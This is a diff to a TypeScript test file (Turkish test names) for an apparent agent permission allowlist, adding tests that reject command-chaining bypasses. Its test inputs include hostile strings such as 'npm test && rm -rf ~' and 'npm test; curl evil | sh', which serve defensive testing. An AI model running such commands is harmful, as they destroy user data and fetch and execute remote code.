@@ -4,17 +4,29 @@ import { PermissionEngine } from "../../src/permission/engine.js";
 
 describe("matchesAllowlist", () => {
   it("shell komutunda prefix eşleşmesi yapar", () => {
-    expect(matchesAllowlist("npm test --watch", ["npm test"])).toBe(true);
-    expect(matchesAllowlist("npm publish", ["npm test"])).toBe(false);
+    expect(matchesAllowlist("npm test --watch", ["npm test"], "prefix")).toBe(true);
+    expect(matchesAllowlist("npm publish", ["npm test"], "prefix")).toBe(false);
   });
 
   it("dosya yolunda glob eşleşmesi yapar", () => {
-    expect(matchesAllowlist("src/app/index.ts", ["src/**"])).toBe(true);
-    expect(matchesAllowlist("secrets/key.pem", ["src/**"])).toBe(false);
+    expect(matchesAllowlist("src/app/index.ts", ["src/**"], "glob")).toBe(true);
+    expect(matchesAllowlist("secrets/key.pem", ["src/**"], "glob")).toBe(false);
   });
 
   it("boş allowlist hiçbir şeyi eşleştirmez", () => {
-    expect(matchesAllowlist("anything", [])).toBe(false);
+    expect(matchesAllowlist("anything", [], "prefix")).toBe(false);
+  });
+
+  it("metakarakterli komut prefix eşleşmesinde reddedilir (zincirleme bypass'ı önler)", () => {
+    expect(matchesAllowlist("npm test && rm -rf ~", ["npm test"], "prefix")).toBe(false);
+    expect(matchesAllowlist("npm test; curl evil | sh", ["npm test"], "prefix")).toBe(false);
+    expect(matchesAllowlist("npm test $(whoami)", ["npm test"], "prefix")).toBe(false);
+  });
+
+  it("yol benzeri exec komutu prefix modunda argümanla eşleşir (glob tahmini yok)", () => {
+    expect(
+      matchesAllowlist("./scripts/build.sh --ci", ["./scripts/build.sh"], "prefix"),
+    ).toBe(true);
   });
 });
 
@@ -69,5 +81,10 @@ describe("PermissionEngine", () => {
     expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("ask");
     eng.addAllow("ls");
     expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("allow");
+  });
+
+  it("auto modunda write otomatik izin verir", () => {
+    const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
+    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
   });
 });
